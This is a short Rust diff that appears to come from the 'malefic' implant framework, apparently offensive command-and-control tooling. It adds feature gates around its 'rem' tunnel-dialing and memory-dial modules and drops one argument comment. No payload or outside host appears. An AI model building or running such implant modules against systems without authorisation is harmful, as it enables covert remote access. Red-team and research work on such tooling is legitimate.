@@ -1,6 +1,7 @@
 use anyhow::anyhow;
 use async_trait::async_trait;
 use futures::SinkExt;
+#[cfg(any(feature = "rem_static", feature = "rem_reflection"))]
 use malefic_helper::common::rem;
 use malefic_helper::to_error;
 use malefic_modules::{
@@ -33,12 +34,15 @@ impl ModuleImpl for LoadRem {
     }
 }
 
+#[cfg(feature = "rem_dial")]
 pub struct RemDial {}
 
+#[cfg(feature = "rem_dial")]
 #[async_trait]
 #[module_impl("rem")]
 impl Module for RemDial {}
 
+#[cfg(feature = "rem_dial")]
 #[async_trait]
 impl ModuleImpl for RemDial {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
@@ -52,19 +56,21 @@ impl ModuleImpl for RemDial {
     }
 }
 
+#[cfg(feature = "memory_dial")]
 pub struct MemoryDial {}
 
+#[cfg(feature = "memory_dial")]
 #[async_trait]
 #[module_impl("memory_dial")]
 impl Module for MemoryDial {}
 
+#[cfg(feature = "memory_dial")]
 #[async_trait]
 impl ModuleImpl for MemoryDial {
     async fn run(&mut self, id: u32, receiver: &mut Input, sender: &mut Output) -> Result {
         let request = check_request!(receiver, Body::Request)?;
         let Request { args, .. } = request;
-
-        // 需要两个参数：memhandle 和 dst
+        
         if args.len() != 2 {
             return Err(anyhow!("Need two arguments: memhandle and dst"));
         }
